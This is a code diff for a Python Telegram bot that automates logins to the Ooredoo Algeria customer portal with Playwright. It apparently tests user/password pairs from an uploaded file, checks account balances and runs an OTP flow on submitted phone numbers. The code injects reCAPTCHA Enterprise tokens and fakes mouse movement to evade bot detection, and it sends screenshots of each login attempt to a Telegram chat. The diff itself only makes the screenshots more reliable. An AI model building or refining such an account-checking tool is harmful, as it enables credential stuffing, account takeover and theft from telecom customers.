@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Ooredoo Bot - headful mode + stronger reCAPTCHA
+Ooredoo Bot - fixed screenshot timeout
 """
 
 import os
@@ -24,7 +24,7 @@ load_dotenv()
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
 TELEGRAM_CHAT_ID = int(os.getenv("TELEGRAM_CHAT_ID", "0"))
 MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
-HEADLESS = False  # ✅ headful باش reCAPTCHA يخدم
+HEADLESS = False
 RETRY_DELAY = 3
 
 HOME_URL = "https://my.ooredoo.dz/"
@@ -156,7 +156,25 @@ def is_invalid_creds(text):
 
 
 # ============================================================
-#  🧩 reCAPTCHA Enterprise
+#  ✅ Safe screenshot
+# ============================================================
+async def safe_screenshot(page, path, full_page=True):
+    try:
+        await page.screenshot(
+            path=path,
+            full_page=full_page,
+            timeout=8000,
+            animations="disabled",
+            caret="hide",
+        )
+        return True
+    except Exception as e:
+        log_to_file(f"screenshot failed ({path}): {e}", "WARN")
+        return False
+
+
+# ============================================================
+#  🧩 reCAPTCHA
 # ============================================================
 async def inject_recaptcha_token(page):
     try:
@@ -175,11 +193,9 @@ async def inject_recaptcha_token(page):
             }
         """)
         log_to_file(f"site_key: {site_key}")
-
         if not site_key:
             return False
 
-        # نستنو grecaptcha
         for _ in range(40):
             ok = await page.evaluate(
                 "() => !!(window.grecaptcha && window.grecaptcha.enterprise)"
@@ -190,7 +206,6 @@ async def inject_recaptcha_token(page):
 
         log_to_file("grecaptcha loaded")
 
-        # نحاكيو المستخدم
         try:
             await page.mouse.move(200, 300)
             await page.wait_for_timeout(200)
@@ -251,7 +266,6 @@ async def inject_recaptcha_token(page):
                 ta.textContent = t;
                 ta.dispatchEvent(new Event('input',  {bubbles: true}));
                 ta.dispatchEvent(new Event('change', {bubbles: true}));
-
                 if (window.___grecaptcha_cfg) {
                     const clients = window.___grecaptcha_cfg.clients || {};
                     for (const id in clients) {
@@ -294,7 +308,15 @@ async def run_otp_flow(app, chat_id, phone):
             viewport={"width": 412, "height": 915},
             user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                         "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
+            ignore_https_errors=True,
         )
+
+        # ✅ نحذفو الخطوط باش ما يعلّقش screenshot
+        try:
+            await ctx.route("**/*.{woff,woff2,ttf,otf,eot}", lambda r: r.abort())
+        except Exception:
+            pass
+
         page = await ctx.new_page()
 
         try:
@@ -310,10 +332,14 @@ async def run_otp_flow(app, chat_id, phone):
             except Exception:
                 pass
 
-            await page.screenshot(path="/tmp/otp_step1.png", full_page=True)
-            with open("/tmp/otp_step1.png", "rb") as f:
-                await bot.send_photo(chat_id=chat_id, photo=f,
-                    caption="📸 الصفحة", parse_mode="HTML")
+            # 📸 screenshot آمن
+            if await safe_screenshot(page, "/tmp/otp_step1.png", True):
+                try:
+                    with open("/tmp/otp_step1.png", "rb") as f:
+                        await bot.send_photo(chat_id=chat_id, photo=f,
+                            caption="📸 الصفحة", parse_mode="HTML")
+                except Exception:
+                    pass
 
             # كتابة الرقم
             try:
@@ -336,11 +362,14 @@ async def run_otp_flow(app, chat_id, phone):
             except Exception as e:
                 log_to_file(f"fill error: {e}", "ERROR")
 
-            await page.screenshot(path="/tmp/otp_step2.png", full_page=True)
-            with open("/tmp/otp_step2.png", "rb") as f:
-                await bot.send_photo(chat_id=chat_id, photo=f,
-                    caption=f"📸 بعد <code>{phone}</code>",
-                    parse_mode="HTML")
+            if await safe_screenshot(page, "/tmp/otp_step2.png", True):
+                try:
+                    with open("/tmp/otp_step2.png", "rb") as f:
+                        await bot.send_photo(chat_id=chat_id, photo=f,
+                            caption=f"📸 بعد <code>{phone}</code>",
+                            parse_mode="HTML")
+                except Exception:
+                    pass
 
             # reCAPTCHA
             await bot.send_message(chat_id=chat_id,
@@ -383,7 +412,6 @@ async def run_otp_flow(app, chat_id, phone):
                 except Exception:
                     pass
 
-            # نستنو
             await bot.send_message(chat_id=chat_id,
                 text="⏳ <b>نستنو...</b> (60s)",
                 parse_mode="HTML")
@@ -423,10 +451,13 @@ async def run_otp_flow(app, chat_id, phone):
 
             await page.wait_for_timeout(2000)
 
-            await page.screenshot(path="/tmp/otp_step3.png", full_page=True)
-            with open("/tmp/otp_step3.png", "rb") as f:
-                await bot.send_photo(chat_id=chat_id, photo=f,
-                    caption="📸 الصفحة الحالية", parse_mode="HTML")
+            if await safe_screenshot(page, "/tmp/otp_step3.png", True):
+                try:
+                    with open("/tmp/otp_step3.png", "rb") as f:
+                        await bot.send_photo(chat_id=chat_id, photo=f,
+                            caption="📸 الصفحة الحالية", parse_mode="HTML")
+                except Exception:
+                    pass
 
             if page_changed or otp_field_visible:
                 await bot.send_message(chat_id=chat_id,
@@ -482,12 +513,14 @@ async def run_otp_flow(app, chat_id, phone):
 
             await page.wait_for_timeout(500)
 
-            await page.screenshot(path="/tmp/otp_step4.png", full_page=True)
-            with open("/tmp/otp_step4.png", "rb") as f:
-                await bot.send_photo(chat_id=chat_id, photo=f,
-                    caption=f"📸 بعد الرمز", parse_mode="HTML")
+            if await safe_screenshot(page, "/tmp/otp_step4.png", True):
+                try:
+                    with open("/tmp/otp_step4.png", "rb") as f:
+                        await bot.send_photo(chat_id=chat_id, photo=f,
+                            caption=f"📸 بعد الرمز", parse_mode="HTML")
+                except Exception:
+                    pass
 
-            # نضغطو زر التحقق
             try:
                 btn = page.get_by_role("button",
                     name=re.compile("valider|v[ée]rifier|confirmer|suivant|continuer", re.I))
@@ -516,10 +549,13 @@ async def run_otp_flow(app, chat_id, phone):
             except Exception:
                 pass
 
-            await page.screenshot(path="/tmp/otp_final.png", full_page=True)
-            with open("/tmp/otp_final.png", "rb") as f:
-                await bot.send_photo(chat_id=chat_id, photo=f,
-                    caption="📸 النهائية", parse_mode="HTML")
+            if await safe_screenshot(page, "/tmp/otp_final.png", True):
+                try:
+                    with open("/tmp/otp_final.png", "rb") as f:
+                        await bot.send_photo(chat_id=chat_id, photo=f,
+                            caption="📸 النهائية", parse_mode="HTML")
+                except Exception:
+                    pass
 
             try:
                 body = await page.inner_text("body")
@@ -556,7 +592,7 @@ async def run_otp_flow(app, chat_id, phone):
 
 
 # ============================================================
-#  Username Flow (كما هو)
+#  Username Flow
 # ============================================================
 async def wait_page_ready(page, timeout=30):
     start = time.time()
@@ -735,7 +771,13 @@ async def try_account(browser, user, pwd, bot, chat_id):
         viewport={"width": 412, "height": 915},
         user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                     "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
+        ignore_https_errors=True,
     )
+    try:
+        await ctx.route("**/*.{woff,woff2,ttf,otf,eot}", lambda r: r.abort())
+    except Exception:
+        pass
+
     page = await ctx.new_page()
     try:
         await page.goto(SIGNIN_URL, wait_until="domcontentloaded", timeout=60000)
@@ -765,24 +807,24 @@ async def try_account(browser, user, pwd, bot, chat_id):
             await ctx.close()
             return {"status": "retry", "msg": "fill_password"}
         await page.wait_for_timeout(500)
-        try:
-            await page.screenshot(path="/tmp/before.png", full_page=True)
-            with open("/tmp/before.png", "rb") as f:
-                await bot.send_photo(chat_id=chat_id, photo=f,
-                    caption=f"📸 قبل: <code>{user}</code>", parse_mode="HTML")
-        except Exception:
-            pass
+        if await safe_screenshot(page, "/tmp/before.png", True):
+            try:
+                with open("/tmp/before.png", "rb") as f:
+                    await bot.send_photo(chat_id=chat_id, photo=f,
+                        caption=f"📸 قبل: <code>{user}</code>", parse_mode="HTML")
+            except Exception:
+                pass
         if not await click_connexion(page):
             await ctx.close()
             return {"status": "retry", "msg": "click"}
         result = await wait_for_result(page, timeout=60)
-        try:
-            await page.screenshot(path="/tmp/after.png", full_page=False)
-            with open("/tmp/after.png", "rb") as f:
-                await bot.send_photo(chat_id=chat_id, photo=f,
-                    caption=f"📸 بعد: <code>{user}</code>", parse_mode="HTML")
-        except Exception:
-            pass
+        if await safe_screenshot(page, "/tmp/after.png", False):
+            try:
+                with open("/tmp/after.png", "rb") as f:
+                    await bot.send_photo(chat_id=chat_id, photo=f,
+                        caption=f"📸 بعد: <code>{user}</code>", parse_mode="HTML")
+            except Exception:
+                pass
         if result["status"] == "success":
             await page.wait_for_timeout(2000)
             body = await page.inner_text("body")
@@ -980,8 +1022,7 @@ async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         asyncio.create_task(run_otp_flow(ctx.application, update.effective_chat.id, text))
         return
 
-    await update.message.reply_text(
-        "💡 ابعتلي ملف أو رقم.", parse_mode="HTML")
+    await update.message.reply_text("💡 ابعتلي ملف أو رقم.", parse_mode="HTML")
 
 
 def main():
